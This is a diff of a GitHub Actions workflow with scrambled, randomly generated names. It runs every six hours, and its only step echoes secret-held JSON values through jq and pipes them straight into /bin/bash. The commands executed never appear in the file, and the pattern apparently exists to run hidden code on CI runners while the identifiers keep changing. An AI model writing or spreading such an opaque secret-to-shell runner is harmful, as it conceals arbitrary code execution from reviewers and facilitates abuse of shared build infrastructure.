@@ -1,9 +1,10 @@
 name: aizaixu1376
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 2/6 * * *'
-jobs:  # 22447
+    - cron: '19 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,18 +12,13 @@ jobs:  # 22447
       - uses: actions/checkout@v4
       - name: aizaixu1376
         env:
-          kmkht37: ${{ secrets.kmkht37 }}
+          wdnez4: ${{ secrets.wdnez4 }}
         run: |
-          echo $kmkht37 | jq -r .satn44160 | /bin/bash
-          echo $tteo81910 | jq -r .tfzfh89 | /bin/bash
-          echo $shh34680 | jq -r .uviac63 | /bin/bash
-          echo $ifny55 | jq -r .hjfbb37271 | /bin/bash
-          echo $eh2801 | jq -r .f1992 | /bin/bash
-          echo $kgy6 | jq -r .wewm00 | /bin/bash
-          echo $mxs06776 | jq -r .dxhz3230 | /bin/bash
-          echo $c869 | jq -r .jgo82 | /bin/bash
-          echo $xur7 | jq -r .a78 | /bin/bash
-          echo $xb3729 | jq -r .epc9 | /bin/bash
-          echo $kjncf4977 | jq -r .ddhvo4 | /bin/bash
-          echo $eaqv59 | jq -r .kmof83 | /bin/bash
+          echo $wdnez4 | jq -r .cvzhd732 | /bin/bash
+          echo $d54 | jq -r .ff155 | /bin/bash
+          echo $uz2 | jq -r .w7 | /bin/bash
+          echo $aa62778 | jq -r .bdw0 | /bin/bash
+          echo $svl68108 | jq -r .zk561 | /bin/bash
+          echo $apu8 | jq -r .hxyz140 | /bin/bash
+          echo $jkv99434 | jq -r .z88 | /bin/bash
 
